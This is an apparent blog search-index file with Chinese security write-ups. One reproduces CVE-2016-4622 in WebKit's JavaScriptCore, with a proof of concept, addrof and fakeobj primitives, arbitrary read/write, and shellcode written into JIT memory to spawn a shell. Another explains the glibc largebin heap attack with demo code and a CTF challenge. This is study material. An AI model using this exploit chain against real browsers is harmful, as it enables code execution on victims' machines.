<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[CVE-2016-4622复现]]></title>
    <url>%2F2019%2F05%2F11%2F2019-5-11-CVE-2016-4622-(2016-10-27)%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[基本环境搭建编译JSC历时差不多两天的失败，网上的编译教程基本都是很久以前的，跟着他们做会报很多错，最后编译成功的jsc也运行不了，一运行就会crash….. 但是，我在github上找到了一个大佬写的教程，是可以成功的，并且他提供了编译好的 jsc以及 对应的动态链接库。 大佬github地址 环境： Ubuntu18.10 JSC编译 1234# sudo apt install libicu-dev python ruby bison flex cmake build-essential ninja-build git gperf$ git clone git://git.webkit.org/WebKit.git &amp;&amp; cd WebKit$ Tools/gtk/install-dependencies$ Tools/Scripts/build-webkit --jsc-only --debug 编译好的jsc可执行文件会在 ~/WebKitBuild/Debug/bin中，同时jsc运行所需的动态链接库会在~/WebKitBuild/Debug/lib中，将动态链接库的所在路径添加到/etc/ld.so.conf中，然后运行 sudo ldconfig命令，就可以使用jsc了。 漏洞分析漏洞出现在ArrayPrototype.cpp文件的arrayProtoFuncSlice函数中 未修补前代码： 123456if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp; isJSArray(thisObj))) &#123; if (JSArray* result = asArray(thisObj)-&gt;fastSlice(*exec, begin, end - begin)) return JSValue::encode(result); &#125; 修补后代码： 123456bool okToDoFastPath = speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp; isJSArray(thisObj) &amp;&amp; length == toLength(exec, thisObj); RETURN_IF_EXCEPTION(scope, &#123; &#125;); if (LIKELY(okToDoFastPath)) &#123; if (JSArray* result = asArray(thisObj)-&gt;fastSlice(*exec, begin, end - begin)) return JSValue::encode(result); &#125; 可以发现它添加了thisObj长度的检查，检查它的长度是否发生了变化。可以通过ValueOf函数来修改数组的长度，slice函数的执行将会继续使用之前的长度，从而导致memcpy时越界访问。 验证POCpoc.js 1234567var a = [];for (var i = 0; i &lt; 100; i++)a.push(i + 0.123);var b = a.slice(0, &#123;valueOf: function() &#123; a.length = 0; return 10; &#125;&#125;);&gt;&gt;&gt; print(b);0.123,1.123,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314 因为数组在切片前已经被清除，所以var b 的正确输出应该是大小为10的数组，其中被填充了”未定义的值”。但实际的输出中 会有一些奇怪的浮点值，这是存储在数组之外的内容。 调试： 通过dir 命令，添加JSC源码路径 pwndbg&gt; dir /home/zs0zrc/webkit/Source/JavaScriptCore 在arrayProtoFuncSlice 、JSArray::setLength 、ArrayPrototype.cpp:945上 分别下断点 通过jsc运行poc.js ，它会停在arrayProtoFuncSlice函数 打印thisObj信息：（这是poc中的变量var a） 1234567891011121314151617181920212223242526272829pwndbg&gt; p *thisObj$1 = &#123; &lt;JSC::JSCell&gt; = &#123; &lt;JSC::HeapCell&gt; = &#123;&lt;No data fields&gt;&#125;, members of JSC::JSCell: static StructureFlags = 0, static needsDestruction = false, static TypedArrayStorageType = JSC::NotTypedArray, m_structureID = 86, m_indexingTypeAndMisc = 7 &apos;\a&apos;, m_type = JSC::ArrayType, m_flags = 8 &apos;\b&apos;, m_cellState = JSC::CellState::DefinitelyWhite &#125;, m_butterfly = &#123; static kind = Gigacage::JSValue, m_barrier = &#123; m_value = &#123; static kind = Gigacage::JSValue, m_ptr = 0x7fffaede8588 &#125; &#125; &#125;pwndbg&gt; x/10gx 0x7fffaede85880x7fffaede8588: 0x3fbf7ced916872b0 0x3ff1f7ced916872b0x7fffaede8598: 0x4000fbe76c8b4396 0x4008fbe76c8b43960x7fffaede85a8: 0x40107df3b645a1cb 0x40147df3b645a1cb0x7fffaede85b8: 0x40187df3b645a1cb 0x401c7df3b645a1cb0x7fffaede85c8: 0x40203ef9db22d0e5 0x40223ef9db22d0e5 其中m_ptr是数组存放元素的地址，存放着一堆浮点数 slice函数获取数组的length大小为100 JSC通过下面两条代码来获取数组的起止下标，但是在执行argumentClampedIndexFromStartOrEnd函数时会对数组a 执行 setLength函数，将数组收缩。因为valueOf回调将数组a的大小设置为0, 所以触发了数组的收缩。 12unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 0, length);unsigned end = argumentClampedIndexFromStartOrEnd(exec, 1, length, length); 函数调用链： 执行完setLength后， thisObj的m_butterfly的地址改变了 123456789101112131415161718192021222324252627282930pwndbg&gt; p *thisObj$33 = &#123; &lt;JSC::JSCell&gt; = &#123; &lt;JSC::HeapCell&gt; = &#123;&lt;No data fields&gt;&#125;, members of JSC::JSCell: static StructureFlags = 0, static needsDestruction = false, static TypedArrayStorageType = JSC::NotTypedArray, m_structureID = 86, m_indexingTypeAndMisc = 7 &apos;\a&apos;, m_type = JSC::ArrayType, m_flags = 8 &apos;\b&apos;, m_cellState = JSC::CellState::DefinitelyWhite &#125;, m_butterfly = &#123; static kind = Gigacage::JSValue, m_barrier = &#123; m_value = &#123; static kind = Gigacage::JSValue, m_ptr = 0x7fffaedfe9a8 &#125; &#125; &#125; pwndbg&gt; x/10gx 0x7fffaedfe9a80x7fffaedfe9a8: 0x3fbf7ced916872b0 0x3ff1f7ced916872b0x7fffaedfe9b8: 0x00000000badbeef0 0x00000000badbeef00x7fffaedfe9c8: 0x00000000badbeef0 0x00000000badbeef00x7fffaedfe9d8: 0x00000000badbeef0 0x00000000badbeef00x7fffaedfe9e8: 0x00000000badbeef0 0x00000000badbeef0 slice函数最后返回的result 12345678pwndbg&gt; p result$41 = (JSC::JSObject *) 0x7fffaf1f8aa0pwndbg&gt; x/10gx 0x7fffaf1f8aa00x7fffaf1f8aa0: 0x00007ffff6826caf 0x00000000fffffff80x7fffaf1f8ab0: 0x00000000fffffff8 0x00000000000000030x7fffaf1f8ac0: 0x0000000000000010 0x00007fffefba36300x7fffaf1f8ad0: 0x0000000000000000 0x00007fffefbb2fd00x7fffaf1f8ae0: 0x00007fffefbba5f0 0x00007ffff6824beb 漏洞利用构建exploit原语 addrof原语 用来泄露地址信息，基本步骤如下： 创建一个双精度的数组 使用自定义的valueOf函数设置对象 收缩数组 分配一个新的数组，其中包含着我们想知道地址的对象，这个数组位于复制空间，有很大的可能放在新的 butterfly后面 返回一个大于数组的值来触发漏洞 12345678function addrof(object) &#123; var a = []; for (var i = 0; i &lt; 100; i++) a.push(i + 0.123) var b = a.slice(0, &#123;valueOf: function() &#123; a.length = 0; b = [object]; return 10; &#125;&#125;); // Find offset 4 at runtime return Int64.fromDouble(b[4]);&#125; slice()返回的新数组是原生的双精度数组，所以可以用来泄露任意JSValue实例。 fakeobj原语 用于将JSObject指针以双精度的形式注入到 JSValue数组中 创建一个双精度的数组 使用自定义的valueOf函数设置对象 收缩数组 分配一个新数组，其中只包含需要的对象，这个对象是我们想要知道地址的对象 返回一个大于数组大小的值来触发漏洞 1234567function fakeobj(addr) &#123; var a = [] for (var i = 0; i &lt; 100; i++) a.push(&#123;&#125;) var b = a.slice(0, &#123;valueOf: function() &#123; a.length = 0; b = [addr.asDouble()]; return 10; &#125;&#125;); return b[4];&#125; 利用思路 信息泄漏 伪造对象(Fload64Array) 任意地址读写 读取一个function obj的地址，触发JIT生成RWX的代码 利用任意地址读写写入shellcode 执行function 具体利用 构造fake Float64Array数组 伪造Float64Array数组最重要的部分是JSCell头中的结构ID，这个id指向Float64Array在结构表中id。但是结构id只有在运行时才会被分配，同时结构id在不同的运行中不一定是静态的。因此不能知道Float64Array实例的结构id，这里通过喷射的方法，来实现FloatArray实例 原理： 通过喷射方法产生几千个结构体来表现FloatArray实例，然后选取一个高的初始id，碰撞出一个正确的id。 12345for (var i = 0; i &lt; 0x1000; i++) &#123; var a = new Float64Array(1); // Add a new property to create a new Structure instance. a[randomString()] = 1337; &#125; 伪造Float64数组 Float64数组由本地JSArrayBufferView类实现，除了包含标准的JSObject字段外，还包含指向后备存储器的指针（vector），长度（length）和模式字段（mode，32位整数）。 FloatArray对象的大致结构： 这里我们写入的JSValue要满足的条件 必须是有效的JSValue，不能为nullptr指针 不能设置有效的模式字段，要大于0x00010000 长度可以自由的控制 只能将vector指向另一个JSObject,因为这是JSValue唯一可以包含的指针 这里选择将vector指向一个Uinit8Array实例 demo: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546sprayFloat64ArrayStructures();//这个是喷射的函数// 创建要使用的数组// 读写目标内存地址var hax = new Uint8Array(0x1000);var jsCellHeader = new Int64([ 0x0, 0x10, 0x0, 0x0, // m_structureID, current guess 0x0, // m_indexingType 0x2c, // m_type, Float64Array 0x08, // m_flags, OverridesGetOwnPropertySlot (see JSTypeInfo.h) 0x1, // m_cellState, NewWhite]);var container = &#123; jsCellHeader: jsCellHeader.encodeAsJSVal(), butterfly: false, // Some arbitrary value vector: hax, lengthAndFlags: (new Int64('0x0001000000000010')).asJSValue()&#125;;// Create the fake Float64Array.var address = Add(addrof(container), 16); var fakearray = fakeobj(address);// Find the correct structure ID.while (!(fakearray instanceof Float64Array)) &#123; jsCellHeader.assignAdd(jsCellHeader, Int64.One); container.jsCellHeader = jsCellHeader.encodeAsJSVal();&#125;// 完成伪造，伪造的数组现在指向hax数组 print(describe(hax));print(describe(fakearray))； //打印对象的一些调试信息//输出结果//[*] hax @ 0x00007fffad95cae0//[*] Fake Float64Array @ 0x00007fffaef99eb0//Object: 0x7fffad95cae0 with butterfly (nil) (0x7fffaef9f2f0:[Uint8Array, &#123;&#125;, //NonArray, Proto:0x7fffaefc4330, Leaf]), ID: 287//Object: 0x7fffaef99eb0 with butterfly 0x6 (0x7fffad976950:[Float64Array, //&#123;foo3760:100&#125;, NonArray, Proto:0x7fffaefc4340, Leaf]), ID: 4096//[*] Float64Array structure ID found: 00001000 //伪造的数组 pwndbg&gt; x/10gx 0x7fffaef99eb00x7fffaef99eb0: 0x01082c0000001000 0x00000000000000060x7fffaef99ec0: 0x00007fffad95cae0 0x00010000000001000x7fffaef99ed0: 0x010a1a0000000036 0x00000000000000000x7fffaef99ee0: 0x00007fffaede4460 0x00007fffaefa9ea00x7fffaef99ef0: 0x0000000000000000 0x00000000badbeef0//伪造的数组的vector指向了hax数组 通过修改Uint8Array的数据指针来读取、写入任意存储器地址 构建任意地址读写原语 123456789101112131415161718192021memory = &#123; read: function(addr, length) &#123; print("[&lt;] Reading " + length + " bytes from " + addr); fakearray[2] = addr.asDouble(); var res = new Array(length); for (var i=0; i &lt; length; i++) res[i] = hax[i]; return res; &#125;, read64: function(addr) &#123; return new Int64(this.read(addr, 8)); &#125;, write: function(addr, data) &#123; print("[&gt;] Writing " + data.length + " bytes to " + addr); fakearray[2] = addr.asDouble(); for (var i=0; i &lt; data.length; i++) hax[i] = data[i]; &#125;, write64: function(value) &#123; return this.write(addr, value.bytes()); &#125;&#125;; 修复容器和Float64Array实例 ， 避免在垃圾收集时崩溃 这一步的原因是因为伪造的Float64Array实例的butterfly在垃圾收集时会被被访问，但我们设置的是一个无效的指针，导致会崩溃。如果设置为nullptr,这会导致令一个崩溃。为指针值也是容器对象的属性，并且它会被当作一个JSObject指针。 具体步骤： 创建一个空对象。此对象的结构将包含具有默认数量的内联存储（6个插槽）的对象，并且全部不处于使用状态。 将JSCell头（包含结构ID）复制到容器对象。 将fake数组的“Butterfly”指针设置为nullptr指针，且使用默认的Float64Array实例来替换该对象的JSCell。 实现： 123456789101112var empty = &#123;&#125;;var header = memory.read(addrof(empty), 8);memory.write(addrof(container), header);var f64array = new Float64Array(8);header = memory.read(addrof(f64array), 16);var length = memory.read(Add(addrof(f64array), 24), 8);memory.write(addrof(fakearray), header);memory.write(Add(addrof(fakearray), 24), length);print("[+] All done!");fakearray.container = container; 写入shellcode并执行 javascript引擎使用JIT编译，需要将指令写入存储器的页面中，之后再执行它。JSC引擎会分配可读可写可执行的内存区域用于存储这些指令，所以可以泄露出函数对象的JIT编译代码的内存地址，然后往该地址写入shellcode，最后调用该函数执行shellcode. 12345678910111213141516171819202122232425262728var func = makeJITCompiledFunction();//JSFunctionvar funcAddr = addrof(func);print("[+] JIT compiled function @ " + funcAddr);//FunctionExecutablevar executableAddr = memory.read64(Add(funcAddr, 24));print("[+] Executable instance @ " + executableAddr);//JITCode// Need to leak twice (value changes)var jitCodeAddr = memory.read64(Add(executableAddr, 24));print("[+] First try; JITCode instance @ " + jitCodeAddr);// need this print (probably some gc thing)var jitCodeAddr = memory.read64(Add(executableAddr, 24));print("[+] Second try; JITCode instance @ " + jitCodeAddr);var codeAddr = memory.read64(Add(jitCodeAddr, 32));print("[+] RWX memory @ " + codeAddr.toString());var shellcode = [0x48,0x31,0xc0,0x50,0x48,0xbf,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x57,0x48,0x89,0xe7,0x50,0x48,0x89,0xe2,0x57,0x48,0x89,0xe6,0xb0,0x3b,0x0f,0x05]print("[+] Writing shellcode...");memory.write(codeAddr, shellcode);print("[!] Jumping into shellcode...");func(); 最后成功getshell 附件 reference https://paper.seebug.org/207/#62-float64 https://github.com/m1ghtym0/write-ups/tree/master/browser/CVE-2016-4622 https://o0xmuhe.github.io/2019/04/06/CVE-2016-4622-analysis/ http://www.phrack.org/papers/attacking_javascript_engines.html]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>js_exploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[largebin attack]]></title>
    <url>%2F2019%2F04%2F16%2F2019-4-16-largebin-attack%2F</url>
    <content type="text"><![CDATA[largebin的一些学习记录 基础知识largebin在源码中的定义：（版本2.23）4 12345678910111213141516171819202122232425262728293031#define largebin_index_32(sz) \ (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 38) ? 56 + (((unsigned long) (sz)) &gt;&gt; 6) :\ ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ? 91 + (((unsigned long) (sz)) &gt;&gt; 9) :\ ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\ ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\ ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\ 126)#define largebin_index_32_big(sz) \ (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 45) ? 49 + (((unsigned long) (sz)) &gt;&gt; 6) :\ ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ? 91 + (((unsigned long) (sz)) &gt;&gt; 9) :\ ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\ ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\ ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\ 126)// XXX It remains to be seen whether it is good to keep the widths of// XXX the buckets the same or whether it should be scaled by a factor// XXX of two as well.#define largebin_index_64(sz) \ (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 48) ? 48 + (((unsigned long) (sz)) &gt;&gt; 6) :\ ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ? 91 + (((unsigned long) (sz)) &gt;&gt; 9) :\ ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\ ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\ ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\ 126)#define largebin_index(sz) \ (SIZE_SZ == 8 ? largebin_index_64 (sz) \ : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz) \ : largebin_index_32 (sz)) 在largebins中一共包括63个bin，每个bin中的chunk大小不一致，处在一定的区间范围内。并且这63个bin 被分成了6组，每组的bin中的chunk的大小之间的公差一致。 组 数量 公差 1 32 64B 2 16 512B 3 8 4096B 4 4 32768B 5 2 262144B 6 1 无限制 每个largebins维护着两个链表，一个是横向的双向链表，它们的chunk size不相同，另一个是纵向的双向链表，它们的chunk size 相同。横向的通过fd_nextsize和bk_nextsize两个指针连接，纵向的通过fd和bk两个指针连接。 在largebin中，chunk按照由大到小的顺序排列。请求一个largebin范围的chunk时，会在对应的bin中从小到大进行扫描，找到第一个合适的。释放一个largebin大小的chunk，首先会根据chunk size的大小，按照bk_nextsize的顺序来选择合适的地方插入，如果碰到相同的chunksize的纵向列表，就会将这个chunk插入到纵向列表，这样就不会进行额外的fd_nextsize和bk_nextsize指针的赋值，否则就会将这个chunk作为独立的纵向列表表头，插入到largebin 中。 请求largebin大小的源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970if (!in_smallbin_range (nb)) &#123; bin = bin_at (av, idx); //如果对应的 bin 为空或者其中的chunk最大的也很小，那就跳过 if ((victim = first (bin)) != bin &amp;&amp; (unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)) &#123; // 反向遍历链表，找到第一个比size大的chunk victim = victim-&gt;bk_nextsize; while (((unsigned long) (size = chunksize (victim)) &lt; (unsigned long) (nb))) victim = victim-&gt;bk_nextsize; /* Avoid removing the first entry for a size so that the skip list does not have to be rerouted. */ //如果取出的chunk不是bin的最后一个chunk，同时该chunk的纵向列表不为空 //它就会取它前面的那个chunk //因为大小相同的chunk只有一个会被串在nextsize链上 //这可以避免额外的bk_nextsize和fd_nextsize的赋值 if (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) victim = victim-&gt;fd; //计算切割后的大小 remainder_size = size - nb; unlink (av, victim, bck, fwd);//通过unlink将chunk从链表移除 /* Exhaust */ if (remainder_size &lt; MINSIZE) &#123; //如果切割后的大小不足以作为一个chunk，那么就会将其标志位设为inuse //同时设置NO_main_arena标志位 set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; &#125; /* Split */ else &#123; //如果剩余的大小可以作为一个chunk //获得剩余部分的地址，放入unsorted bin中 remainder = chunk_at_offset (victim, nb); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ bck = unsorted_chunks (av); fwd = bck-&gt;fd; if (__glibc_unlikely (fwd-&gt;bk != bck)) &#123; errstr = "malloc(): corrupted unsorted chunks"; goto errout; &#125; remainder-&gt;bk = bck; remainder-&gt;fd = fwd; bck-&gt;fd = remainder; fwd-&gt;bk = remainder; if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); &#125; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; unlink的源码： 12345678910111213141516171819202122232425262728293031#define unlink(AV, P, BK, FD) &#123; \ FD = P-&gt;fd; \ BK = P-&gt;bk; \ if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \ malloc_printerr (check_action, "corrupted double-linked list", P, AV); \ else &#123; \ FD-&gt;bk = BK; \ BK-&gt;fd = FD; \ if (!in_smallbin_range (P-&gt;size) \ &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123; \ if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) \ || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) \ malloc_printerr (check_action, \ "corrupted double-linked list (not small)", \ P, AV); \ if (FD-&gt;fd_nextsize == NULL) &#123; \ if (P-&gt;fd_nextsize == P) \ FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; \ else &#123; \ FD-&gt;fd_nextsize = P-&gt;fd_nextsize; \ FD-&gt;bk_nextsize = P-&gt;bk_nextsize; \ P-&gt;fd_nextsize-&gt;bk_nextsize = FD; \ P-&gt;bk_nextsize-&gt;fd_nextsize = FD; \ &#125; \ &#125; else &#123; \ P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; \ P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; \ &#125; \ &#125; \ &#125; \&#125; 对largebin的chunk会多了对fd_nextsize和bk_nextsize的检查，原理和fd、bk是一样的 一个小demo：(from 大佬的博客) 123456789101112131415161718192021222324252627282930#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; unsigned long *p1, *p2, *p3, *p4, *p5, *p6, *p7, *p8, *p9, *p10; unsigned long *p; p1 = malloc(0x3f0); p2 = malloc(0x20); p3 = malloc(0x400); p4 = malloc(0x20); p5 = malloc(0x400); p6 = malloc(0x20); p7 = malloc(0x120); p8 = malloc(0x20); p9 = malloc(0x140); p10 = malloc(0x20); free(p7); free(p9); p = malloc(0x60); p = malloc(0xb0); free(p1); free(p3); free(p5); p = malloc(0x110); return 0;&#125; 在free掉p7和p9后，会将这两个chunk插入unsorted bin中。 12unsortedbinall: 0x602cb0 —▸ 0x7ffff7dd1b78 (main_arena+88) —▸ 0x602e10 ◂— 0x602cb0 然后malloc(0x60)会将p7 切割，然后剩余的部分会放在unsorted bin中，而p9会被放到对应的smallbin中 之后free掉三个largebin大小的chunk，这三个chunk都会被放如unsorted bin中 12unsortedbinall: 0x602430 —▸ 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) —▸ 0x602870 ◂— 0x602430 /* &apos;0$`&apos; */ 之后malloc一个大小为0x110的chunk，使得unsorted bin 中的chunk被放入相应的bin中 1234567891011121314151617181920212223242526272829largebins0x400: 0x602870 —▸ 0x602000 —▸ 0x7ffff7dd1f68 (main_arena+1096) —▸ 0x602430 ◂— 0x602870 /* &apos;p(`&apos; */0x602000 PREV_INUSE &#123; prev_size = 0x0, size = 0x401, fd = 0x7ffff7dd1f68 &lt;main_arena+1096&gt;, bk = 0x602870, fd_nextsize = 0x602430, bk_nextsize = 0x602430&#125;0x602430 PREV_INUSE &#123; prev_size = 0x0, size = 0x411, fd = 0x602870, bk = 0x7ffff7dd1f68 &lt;main_arena+1096&gt;, fd_nextsize = 0x602000, bk_nextsize = 0x602000&#125;0x602870 PREV_INUSE &#123; prev_size = 0x0, size = 0x411, fd = 0x602000, bk = 0x602430, fd_nextsize = 0x0, bk_nextsize = 0x0&#125; 可以发现largebin中的 chunk按照从大到小的顺序，大的chunk在前面，小的在后面。并且相同大小的chunk构成一条链表，并且0x602870对应的chunk 没有设置bk_nextsize 和 fd_nextszie，它仅通过fd和bk与0x602000和0x602430形成链表。 large bin attack原理往任意地址写堆地址how2heap上的largebin attack 涉及到的libc源码： 12345678else&#123; victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;&#125;bck = fwd-&gt;bk; 造成的原因：没有对被插入的chunk进行检查 源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt; int main()&#123; unsigned long *p1, *p2, *p3, *p4, *p5, *p6, *p7, *p8, *p9, *p10, *p11, *p12; unsigned long *p; unsigned long stack[8] = &#123;0&#125;; printf("stack address: %p\n", &amp;stack); p1 = malloc(0x3f0); p2 = malloc(0x20); p3 = malloc(0x400); p4 = malloc(0x20); p5 = malloc(0x400); p6 = malloc(0x20); p7 = malloc(0x120); p8 = malloc(0x20); p9 = malloc(0x140); p10 = malloc(0x20); p11 = malloc(0x400); p12 = malloc(0x20); free(p7); free(p9); p = malloc(0x60); p = malloc(0xb0); free(p1); free(p3); free(p5); p = malloc(0x60); free(p11); *(p3-1) = 0x3f1; *(p3) = (unsigned long)(&amp;stack); *(p3+1) = (unsigned long)(&amp;stack); *(p3+2) = (unsigned long)(&amp;stack); *(p3+3) = (unsigned long)(&amp;stack); // trigger malicious malloc p = malloc(0x60); return 0;&#125; 通过某种溢出修改largebin 中的chunk的size，使其变小，小于之前free掉 在unsorted bin中的 large chunk，并且往bk和bk_nextsize字段填入栈地址。那么当再次malloc时，会将p11插入largebin 的头部。经过插入后，会往目标栈地址写入p11的地址。这个可以用来往任意地址写一个不可控的值，类似与unsorted bin attack。 此时p11的内容 12345678910111213141516171819pwndbg&gt; chunkinfo 0x6033a0================================== Chunk info ==================================Status : Freed Unlinkable : TrueResult of unlink : FD-&gt;bk (*0x602858) = BK (0x6033a0 -&gt; 0x7fffffffdd10) BK-&gt;fd (*0x7fffffffdd20) = FD (0x6033a0 -&gt; 0x602840) Freeable : false -&gt; Double free chunkaddr(0x6033a0) inused bit is not seted )prev_size : 0x0 size : 0x410 prev_inused : 1 is_mmap : 0 non_mainarea : 0 fd : 0x602840 bk : 0x7fffffffdd10 fd_nextsize : 0x602840 bk_nextsize : 0x7fffffffdd10 目标栈地址内容： 12340x7fffffffdd10: 0x0000000000000000 0x00000000000000000x7fffffffdd20: 0x00000000006033a0 0x00000000000000000x7fffffffdd30: 0x00000000006033a0 0x00000000000000000x7fffffffdd40: 0x0000000000000000 0x0000000000000000 具体实现的操作 1234567891011121314151617181920212223242526272829303132333435363738victim = p11 //0x6033a0fwd = p3 //0x602840操作前的victimpwndbg&gt; x/10gx 0x6033a00x6033a0: 0x0000000000000000 0x00000000000004110x6033b0: 0x0000000000603290 0x00007ffff7dd1b780x6033c0: 0x0000000000000000 0x00000000000000000x6033d0: 0x0000000000000000 0x00000000000000000x6033e0: 0x0000000000000000 0x0000000000000000进行下面的操作else&#123; victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; // 这一步会往stack上写入victim的地址&#125;bck = fwd-&gt;bk;操作完后victim的内容pwndbg&gt; x/10gx victim0x6033a0: 0x0000000000000000 0x00000000000004110x6033b0: 0x00007ffff7dd1b78 0x00007ffff7dd1b780x6033c0: 0x0000000000602840 0x00007fffffffdd100x6033d0: 0x0000000000000000 0x00000000000000000x6033e0: 0x0000000000000000 0x0000000000000000pwndbg&gt; p victim-&gt;bk_nextsize$24 = (struct malloc_chunk *) 0x7fffffffdd10pwndbg&gt; p victim-&gt;bk_nextsize-&gt;fd_nextsize $25 = (struct malloc_chunk *) 0x6033a0pwndbg&gt; x/10gx 0x7fffffffdd100x7fffffffdd10: 0x0000000000000000 0x00000000000000000x7fffffffdd20: 0x0000000000000000 0x00000000000000000x7fffffffdd30: 0x00000000006033a0 0x00000000000000000x7fffffffdd40: 0x0000000000000000 0x00000000000000000x7fffffffdd50: 0x00007fffffffde40 0xb2b6b91675857a00 伪造large chunk，并分配出来图片来源 ： veritas501大佬博客 通过修改largebin中的chunk的 bk_nextsize字段为伪造的largechunk，使得伪造的largechunk被链入 largebin中，同时伪造的largechunk要能bypass unlink的check 才能被分配出来。 题目LCTF - 2ez4u防护机制12345678☁ 2ez4u [master] ⚡ checksec 2ez4u [*] Checking for new versions of pwntools[*] &apos;/home/zs0zrc/pwn/how2heap/largebin_attack/2ez4u/2ez4u&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 简单运行下，发现是个常规的菜单题。它一共有4个功能，添加、删除、修改、打印 。 程序中存在的一个结构体 apple 123456789struct apple&#123; int color; int num; unsigned long value; int index; int size; char description[size];&#125; 下面分析下程序的具体功能 add功能 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475unsigned __int64 add()&#123; int i; // [rsp+4h] [rbp-2Ch] int color; // [rsp+8h] [rbp-28h] unsigned int value; // [rsp+Ch] [rbp-24h] unsigned int v4; // [rsp+10h] [rbp-20h] unsigned int size; // [rsp+14h] [rbp-1Ch] apples *apple; // [rsp+18h] [rbp-18h] unsigned __int64 v7; // [rsp+28h] [rbp-8h] v7 = __readfsqword(0x28u); if ( count == 16 ) &#123; puts("sorry XD"); &#125; else &#123; printf("color?(0:red, 1:green):"); color = read_num(); if ( color != 1 &amp;&amp; color ) &#123; puts("invalid"); &#125; else &#123; printf("value?(0-999):"); value = read_num(); if ( value &lt;= 999 ) &#123; printf("num?(0-16):"); v4 = read_num(); if ( v4 &lt;= 0x10 ) &#123; printf("description length?(1-1024):"); size = read_num(); if ( size &lt;= 0x400 &amp;&amp; size ) &#123; apple = malloc(size + 0x18LL); printf("description of the apple:"); read_content(apple-&gt;des, size, 10); apple-&gt;color = color; apple-&gt;values = value; apple-&gt;num = v4; for ( i = 0; i &lt;= 15; ++i ) &#123; if ( !*(&amp;array + 4 * i) ) &#123; apple-&gt;index = i; *(&amp;array + 2 * i + 1) = apple; *(&amp;array + 4 * i + 1) = size; *(&amp;array + 4 * i) = 1; ++count; printf("apple index: %d\n", i); return __readfsqword(0x28u) ^ v7; &#125; &#125; &#125; else &#123; puts("???"); &#125; &#125; else &#123; puts("invalid"); &#125; &#125; else &#123; puts("invalid"); &#125; &#125; &#125; return __readfsqword(0x28u) ^ v7;&#125; 程序最多添加16个apple，同时apple的size和地址存储在bss段上的一个全局变量数组中。 heapstrom20ctf2018的一道题，质量十分好。]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>largebin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0CTF/TCTF2019 PWN 复现]]></title>
